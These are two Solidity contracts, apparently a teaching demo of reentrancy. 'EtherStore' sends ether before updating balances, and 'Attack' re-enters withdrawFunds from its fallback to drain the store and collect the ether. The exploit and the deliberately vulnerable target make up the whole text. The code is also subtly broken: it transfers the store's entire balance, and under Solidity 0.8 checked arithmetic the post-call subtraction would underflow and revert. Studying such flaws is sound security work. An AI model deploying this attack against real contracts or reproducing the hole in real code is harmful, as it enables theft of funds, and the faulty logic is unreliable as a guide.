// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw, "Insufficient balance");
        // 限制提现金额
        require(_weiToWithdraw <= withdrawalLimit, "Exceeds withdrawal limit");
        // 限制允许提现的时间
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "Withdrawal not allowed yet");

        // 使用新的 call 语法，并传递空的 calldata
       (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");


        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./EtherStore.sol"; // 确保路径正确

contract Attack {
    EtherStore public etherStore;

    // 初始化 etherStore 变量
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
  
    function pwnEtherStore() public payable {
        // 攻击需要至少 1 个以太
        require(msg.value >= 1 ether, "Insufficient Ether");
        // 调用 EtherStore 的 depositFunds 函数
        etherStore.depositFunds{value: 1 ether}();
        // 开始攻击
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        // 将合约中的余额发送给调用者
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // fallback 函数 - 攻击的核心逻辑
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}
